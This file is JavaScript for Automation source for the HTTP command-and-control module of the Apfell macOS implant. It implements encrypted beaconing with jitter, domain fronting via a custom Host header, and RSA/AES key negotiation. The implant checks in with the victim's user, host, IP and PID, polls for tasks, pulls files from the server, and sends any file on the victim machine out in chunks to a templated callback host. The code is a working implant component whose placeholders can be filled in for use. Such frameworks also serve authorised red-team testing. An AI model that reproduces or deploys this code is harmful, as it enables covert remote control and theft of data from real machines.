//-------------RESTFUL C2 mechanisms ---------------------------------
class customC2 extends baseC2{
	constructor(interval, baseurl){
		super(interval, baseurl);
		this.commands = [];
		this.api_version = "1.3";
		this.jitter = callback_jitter;
		this.host_header = "domain_front";
		this.aes_psk = "AESPSK"; // base64 encoded key
		if(this.aes_psk !== ""){
		    this.parameters = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyType, $.kSecAttrKeyTypeAES);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeySizeInBits, $.kSecAES256);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyClass, $.kSecAttrKeyClassSymmetric);
		    $.CFDictionarySetValue(this.parameters, $.kSecClass, $.kSecClassKey);
            this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
            let err = Ref();
            this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, err);
		}
        this.using_key_exchange = "encrypted_exchange_check" === "T";
		this.exchanging_keys = this.using_key_exchange;
	}
	gen_sleep_time(){
      //generate a time that's this.interval += (this.interval * 1/this.jitter)
      let plus_min = Math.round(Math.random());
      if(plus_min === 1){
          return this.interval + (this.interval * (Math.round(Math.random()*this.jitter)/100));
      }else{
          return this.interval - (this.interval * (Math.round(Math.random()*this.jitter)/100));
      }
    }
	encrypt_message(data){
	    // takes in the string we're about to send, encrypts it, and returns a new string
	    let err = Ref();
	    let encrypt = $.SecEncryptTransformCreate(this.cryptokey,err);
	    let b = $.SecTransformSetAttribute(encrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
	    b= $.SecTransformSetAttribute(encrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
        //generate a random IV to use
	    let IV = $.NSMutableData.dataWithLength(16);
	    $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
	    b = $.SecTransformSetAttribute(encrypt, $("SecIVKey"), IV, err);
	    // set our data to be encrypted
	    let nsdata = $(data).dataUsingEncoding($.NSUTF8StringEncoding);
        b=$.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, nsdata, err);
        //console.log( $.CFMakeCollectable(err[0]));
        let encryptedData = $.SecTransformExecute(encrypt, err);
        // now we need to prepend the IV to the encrypted data before we base64 encode and return it
        let final_message = IV;
        final_message.appendData(encryptedData);
        return final_message.base64EncodedStringWithOptions(0);
	}
	decrypt_message(data){
        //takes in a base64 encoded string to be decrypted and returned
        //console.log("called decrypt");
        let nsdata = $.NSData.alloc.initWithBase64Encoding(data);
        let decrypt = $.SecDecryptTransformCreate(this.cryptokey, Ref());
        $.SecTransformSetAttribute(decrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), Ref());
	    $.SecTransformSetAttribute(decrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), Ref());
	    //console.log("making ranges");
        //need to extract out the first 16 bytes as the IV and the rest is the message to decrypt
        let iv_range = $.NSMakeRange(0, 16);
        let message_range = $.NSMakeRange(16, nsdata.length - 16);
        //console.log("carving out iv");
        let iv = nsdata.subdataWithRange(iv_range);
        //console.log("setting iv");
        $.SecTransformSetAttribute(decrypt, $("SecIVKey"), iv, Ref());
        //console.log("carving out rest of message");
        let message = nsdata.subdataWithRange(message_range);
        $.SecTransformSetAttribute(decrypt, $("INPUT"), message, Ref());
        //console.log("decrypting");
        let decryptedData = $.SecTransformExecute(decrypt, Ref());
        //console.log("making a string from the message");
        let decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
        //console.log(decrypted_message.js);
        return decrypted_message;
	}
	negotiate_key(){
        // Generate a public/private key pair
        let parameters = $({"type": $("42"), "bsiz": 4096, "perm": false});
        let err = Ref();
        let privatekey = $.SecKeyCreateRandomKey(parameters, err);
        //console.log("generated new key");
        let publickey = $.SecKeyCopyPublicKey(privatekey);
        let exported_public = $.SecKeyCopyExternalRepresentation(publickey, err);
        //$.CFShow($.CFMakeCollectable(err[0]));
        try{
        	//this is the catalina case
        	let b64_exported_public = $.CFMakeCollectable(exported_public);
        	b64_exported_public = b64_exported_public.base64EncodedStringWithOptions(0).js; // get a base64 encoded string version
        	exported_public = b64_exported_public;
        }catch(error){
        	//this is the mojave and high sierra case
        	exported_public = exported_public.base64EncodedStringWithOptions(0).js;
        }
        let s = "abcdefghijklmnopqrstuvwxyz";
	    let session_key = Array(10).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
	    let initial_message = JSON.stringify({"SESSIONID": session_key, "PUB": exported_public});
	    //console.log("sending: " + initial_message);
	    // Encrypt our initial message with sessionID and Public key with the initial AES key
	    while(true){
	        try{
                let base64_pub_encrypted = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(apfell.uuid), initial_message);
                let pub_encrypted = $.NSData.alloc.initWithBase64Encoding(base64_pub_encrypted.js);
                let decrypted_message = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, pub_encrypted, err);
                let json_response = {};
                try{
                	let nsstring_decrypted_message = $.CFMakeCollectable(decrypted_message);
                	nsstring_decrypted_message = $.NSString.alloc.initWithDataEncoding(nsstring_decrypted_message, $.NSUTF8StringEncoding);
                	json_response = JSON.parse(nsstring_decrypted_message.js);
                }catch(error){
                	decrypted_message = $.NSString.alloc.initWithDataEncoding(decrypted_message, $.NSUTF8StringEncoding);
                	json_response = JSON.parse(decrypted_message.js);
                }
                // Adjust our global key information with the newly adjusted session key
                this.aes_psk = json_response['SESSIONKEY']; // base64 encoded key
                //console.log(decrypted_message.js);
                this.parameters = $({"type": $.kSecAttrKeyTypeAES});
                this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
                this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
                this.exchanging_keys = false;
                return session_key;
            }catch(error){
            	//console.log(error.toString());
                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
            }
        }
	}
	getConfig(){
		//A RESTful base config consists of the following:
		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
        let config = {
            "C2": {
                "baseurl": this.baseurl,
                "interval": this.interval,
                "jitter": this.jitter,
                "commands": this.commands.join(","),
                "api_version": this.api_version,
                "host_header": this.host_header,
                "aes_psk": this.aes_psk
            },
            "Host": {
                "user": apfell.user,
                "fullName": apfell.fullName,
                "ips": apfell.ip,
                "hosts": apfell.host,
                "environment": apfell.environment,
                "uptime": apfell.uptime,
                "args": apfell.args,
                "pid": apfell.pid,
                "apfell_id": apfell.id,
                "payload_id": apfell.uuid
            }};
		return JSON.stringify(config, null, 2);
	}
	checkin(ip, pid, user, host, os, arch){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os":os, "architecture": arch};
		if(user === "root"){
		    info['integrity_level'] = 3;
		}
		//calls htmlPostData(url,data) to actually checkin
		//Encrypt our data
		//gets back a unique ID
        if(this.using_key_exchange){
            var sessionID = this.negotiate_key();
            var jsondata = this.htmlPostData("api/v" + this.api_version + "/crypto/EKE/" + sessionID, JSON.stringify(info));
        }else if(this.aes_psk !== ""){
            var jsondata = this.htmlPostData("api/v" + this.api_version + "/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
        }else{
            var jsondata = this.htmlPostData("api/v" + this.api_version + "/callbacks/", JSON.stringify(info));
        }
		apfell.id = jsondata.id;
		// if we fail to get a new ID number, then exit the application
		if(apfell.id === undefined){ $.NSApplication.sharedApplication.terminate(this); }
		return jsondata;
	}
	getTasking(){
		while(true){
		    try{
		        var url = this.baseurl + "api/v" + this.api_version + "/tasks/callback/" + apfell.id + "/nextTask";
		        var task = this.htmlGetData(url);
		        return JSON.parse(task);
		    }
		    catch(error){
		        $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
		    }
		}

	}
	postResponse(task, output){
	    // this will get the task object and the response output
	    return this.postRESTResponse("api/v" + this.api_version + "/responses/" + task.id, output);
	}
	postRESTResponse(urlEnding, data){
		//depending on the amount of data we're sending, we might need to chunk it
		var size= 512000;
		var offset = 0;
		//console.log("total response size: " + data.length);
		do{
		    var csize = data.length - offset > size ? size : data.length - offset;
		    var dataChunk = data.subdataWithRange($.NSMakeRange(offset, csize));
		    var encodedChunk = dataChunk.base64EncodedStringWithOptions(0).js;
		    offset += csize;
		    var postData = {"response": encodedChunk};
		    var jsondata = this.htmlPostData(urlEnding, JSON.stringify(postData));
		}while(offset < data.length);

		return jsondata;
	}
	htmlPostData(urlEnding, sendData, json=true){
	    let url = this.baseurl + urlEnding;
        //console.log(url);
        //encrypt our information before sending it
        if(this.aes_psk !== ""){
            var data = this.encrypt_message(sendData);
        }else{
            var data = $.NSString.alloc.initWithUTF8String(sendData);
        }
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				//console.log("posting: " + sendData + " to " + urlEnding);
				var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
				var postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				if( this.host_header.length > 0){
				    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
				}
				req.setHTTPBody(postData);
				var response = Ref();
				var error = Ref();
				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
				var resp = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
				var deepresp = ObjC.deepUnwrap(resp);
				if(deepresp[0] === "<"|| deepresp.length === 0 || deepresp.includes("ERROR: Requested URL")){
                    //this means we likely got back some form of error or redirect message, not our actual data
                    //console.log(deepresp);
                    continue;
                }
				//console.log("response: " + resp.js);
				if(!this.exchanging_keys){
				    //we're not doing the initial key exchange
				    if(this.aes_psk !== ""){
				        //if we do need to decrypt the response though, do that
                        if(json){
                            resp = ObjC.unwrap(this.decrypt_message(resp));
                            return JSON.parse(resp);
                        }else{
                            return this.decrypt_message(resp);
                        }
				    }else{
                        //we don't need to decrypt it, so we can just parse and return it
                        if(json){
                            return JSON.parse(resp.js);
                        }else{
                            return resp.js;
                        }
				    }
				}
				else{
				    //if we are currently exchanging keys, just return the response so we can decrypt it differently
                    return resp;
				}

			}
			catch(error){
			    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
			}
		}
	}
	htmlGetData(url){
	    while(true){
	        try{
	            var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
                req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
                if( this.host_header.length > 0){
                    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
                }
                var response = Ref();
                var error = Ref();
                var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
                var data = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
                var deepresp = ObjC.deepUnwrap(data);
				if(deepresp[0] === "<"|| deepresp.length === 0 || deepresp.includes("ERROR: Requested URL")){
                    //this means we likely got back some form of error or redirect message, not our actual data
                    //console.log(deepresp);
                    continue;
                }

                if(this.aes_psk !== ""){
                    var decrypted_message = this.decrypt_message(data);
                }else{
                    var decrypted_message = data;
                }
                //console.log(decrypted_message.js);
                return decrypted_message.js;
	        }
	        catch(error){
	            //console.log("error in htmlGetData: " + error.toString());
	            $.NSThread.sleepForTimeInterval(this.gen_sleep_time()); //wait timeout seconds and try again
	        }
	    }
	}
	download(task, params){
        // download just has one parameter of the path of the file to download
        if( does_file_exist(params) ){
            let offset = 0;
            let url = "api/v" + this.api_version + "/responses/" + task.id;
            let chunkSize = 512000; //3500;
            // get the full real path to the file
            try{
                if(params[0] !== "/"){
                    var fileManager = $.NSFileManager.defaultManager;
                    var cwd = fileManager.currentDirectoryPath.js;
                    params = cwd + "/" + params;
                }
                var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
                // Get the file size by seeking;
                var fileSize = handle.seekToEndOfFile;
            }catch(error){
                output = JSON.stringify({'status': 'error', 'user_output': error.toString(), 'completed': true})
            }

            // always round up to account for chunks that are < chunksize;
            let numOfChunks = Math.ceil(fileSize / chunkSize);
            let registerData = JSON.stringify({'total_chunks': numOfChunks, 'full_path': params});
            registerData = convert_to_nsdata(registerData);
            let registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
            //var registerFile = this.postResponse(task, registerData);
            if (registerFile['status'] === "success"){
                handle.seekToFileOffset(0);
                var currentChunk = 1;
                var data = handle.readDataOfLength(chunkSize);
                while(parseInt(data.length) > 0 && offset < fileSize){
                    // send a chunk
                    var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js,'file_id': registerFile['file_id']});
                    fileData = convert_to_nsdata(fileData);
                    this.htmlPostData(url, JSON.stringify({"response": fileData.base64EncodedStringWithOptions(0).js}));
                    //this.postResponse(task, fileData);
                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());

                    // increment the offset and seek to the amount of data read from the file
                    offset += parseInt(data.length);
                    handle.seekToFileOffset(offset);
                    currentChunk += 1;
                    data = handle.readDataOfLength(chunkSize);
                }
                var output = JSON.stringify({"completed":true, "file_id": registerFile['file_id']})
            }
            else{
               var output = JSON.stringify({'status': 'error', 'user_output': "Failed to register file to download", 'completed': true});
            }
        }
        else{
            var output = JSON.stringify({'status': 'error', 'user_output': "file does not exist", 'completed': true});
        }
        return output;
	}
	upload(task, params){
	    try{
            let url = "api/v" + this.api_version + "/files/callback/" + apfell.id;
            let data = JSON.stringify({"file_id": params});
            let file_data = this.htmlPostData(url, data, false);
            //var file_data = this.htmlGetData(this.baseurl + url);
            if(file_data === undefined){
                throw "Got nothing from the Apfell server";
            }
            return $.NSData.alloc.initWithBase64Encoding($(file_data));
	    }catch(error){
	        return error.toString();
	    }

	}
}
//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
ObjC.import('Security');
C2 = new customC2(callback_interval, "callback_host:callback_port/");